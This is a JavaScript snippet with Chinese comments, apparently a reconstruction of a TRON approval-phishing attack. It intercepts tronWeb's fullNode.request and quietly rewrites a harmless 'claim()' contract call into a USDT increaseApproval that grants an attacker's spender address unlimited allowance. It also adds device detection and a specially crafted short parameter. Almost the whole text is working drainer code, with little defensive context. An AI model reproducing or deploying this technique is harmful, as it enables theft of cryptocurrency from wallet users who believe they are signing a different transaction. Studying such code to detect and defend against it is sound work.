🔧 核心：fullNode.request 包装器机制
// 第一阶段：保存原始请求方法
const originalRequest = tronWeb.fullNode.request;

// 第二阶段：安装包装器
tronWeb.fullNode.request = async function(url, body) {
  // 检查请求路径是否包含 triggersmartcontract
  if (url.toLowerCase().includes('triggersmartcontract')) {
    // 改写请求体 — 这是整个攻击的核心
    body.contract_address  = tronWeb.address.toHex(USDT_CONTRACT);
    body.function_selector = 'increaseApproval(address,uint256)';
    body.parameter         = buildAuthParam(spenderHex);  // 见设备分支
    body.call_value        = 0;
  }
  // 调用原始方法，TRON 节点返回真实的未签名交易
  return originalRequest(url, body);
};

// 第三阶段：发起表层 call（触发拦截器）
tronWeb.transactionBuilder.triggerSmartContract(
  SURFACE_CONTRACT, "claim()", ... // ← 表层无关调用
);

// 第四阶段：签名 (TP 弹窗显示的是改写后的真实交易！)
tronWeb.trx.sign(transaction);

// getDeviceOS() 检测 navigator.userAgent
function getDeviceOS() {
  const ua = navigator.userAgent.toLowerCase();
  if (/iphone|ipad|ipod/.test(ua)) return 'ios';
  if (/android/.test(ua))     return 'android';
  return 'pc';
}

// Android：直接使用服务端下发的 config.param（此处模拟）

// iOS / PC：非规范短参数拼接
// 格式：[12字节固定前缀] + [20字节spender地址] + [19字节 0xff]
const prefix = '59bccfbae8597513460f3413';              // 24 hex chars = 12 bytes
const spenderPart = spenderHex.slice(2);                   // 40 hex chars = 20 bytes
const ffPart = 'ffffffffffffffffffffffffffffffffffffff';    // 38 hex chars = 19 bytes
const parameter = prefix + spenderPart + ffPart;          // 102 hex chars = 51 bytes
